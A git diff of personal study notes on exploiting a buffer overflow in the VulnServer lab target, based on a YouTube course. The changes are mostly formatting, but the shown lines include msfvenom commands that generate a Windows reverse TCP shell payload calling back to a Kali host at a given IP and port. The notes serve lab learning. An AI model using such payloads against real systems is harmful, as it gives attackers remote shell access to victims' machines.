@@ -1,6 +1,6 @@
 # Buffer Over Flow
 these notes come from watching the Cyber Mentors Buffer Overflow Videos on youtube https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
-
+All python code here is written in python 2 because that is what comes with kali by default. 
 ## Steps:
 1. Spiking- Finding a vulnerable part of a program.
 2. Fuzzing- send a bunch of characters at a program and see if we can break it.
@@ -59,6 +59,9 @@ Check the EBP for 41414141 meaning it over wrote it will A’s to verify we can 
 
 
 ## Fuzzing: 
+
+#### Kali Linux: 
+
 create python script fuzz.py
 
 ```
@@ -84,11 +87,11 @@ while True:
             sys.exit()
 ```
 
-#### Kali Linux: 
+
 Make fuzz.py executable (chmod +X fuzz.py) or run in python terminal
 Run fuzz.py (make sure VulnServer and Immunity are running on Windows 10)
-fuzz.py might not stop on its own right away. If you see VulnServer crash in Immunity you can 	
-close out of fuzz.py (ctrl + c)
+fuzz.py might not stop on its own right away. 
+If you see VulnServer crash in Immunity you can close out of fuzz.py (ctrl + c)
 
 #### Windows 10: 
 look in Immunity (may or may not have over written the EIP). 
@@ -293,6 +296,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Kali IP> LPORT=<Kali Port#> EXITFUN
 6. -a: architecture; creating for 32bit (x86)
 7. -b: for bad character; add in any characters you would like to exclude. 
 
+** Note: I had to change the command a little to get it to work for me, which is the command you see below. **
 ```
 msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.16 LPORT=4444 EXITFUNC=thread -f c -b '\x00'
 ```
